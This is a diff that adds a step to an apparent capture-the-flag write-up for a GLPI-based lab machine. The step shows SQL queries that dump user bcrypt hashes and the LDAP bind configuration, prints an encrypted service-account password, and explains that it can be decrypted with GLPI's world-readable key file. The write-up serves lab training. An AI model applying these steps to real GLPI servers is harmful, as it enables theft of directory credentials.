@@ -869,6 +869,41 @@ public $dbdefault  = 'glpidb';
 **Next:** Connect to the database and locate authentication-related tables.
 <div align="center">
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 4.4 Recover the LDAP bind credential from the database
+
+**Why this step:** With database access, locate stored credentials. GLPI’s LDAP integration stores a bind password that, unlike the user password hashes, is reversibly encrypted.
+
+**Commands:**
+
+sql
+
+```sql
+SELECT id, name, password FROM glpi_users;
+SELECT * FROM glpi_authldaps\G
+```
+
+**Result (key fields):**
+
+```
+# glpi_users -> bcrypt $2y$10$ hashes (rabbit hole: strong, uncrackable, and app-only)
+
+# glpi_authldaps
+name:          Management Directory
+host:          sso.management.htb      port: 389
+rootdn:        cn=svc-glpi,ou=services,dc=management,dc=htb
+rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
+```
+
+**What this gives you:** An encrypted LDAP bind password for the `svc-glpi` service account. **Key finding:** `rootdn_passwd` is a base64 blob encrypted with XChaCha20-Poly1305 using the world-readable `glpicrypt.key`, so it is fully recoverable. The `glpi_users` bcrypt hashes are a deliberate dead end. (Dead end recorded: bcrypt cost-10 hashes with strong passwords, not crackable, and not mapped to Linux users.)
+
+**Next:** Decrypt `rootdn_passwd` using GLPI’s own key and code.
+<div align="center">
+<br>
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
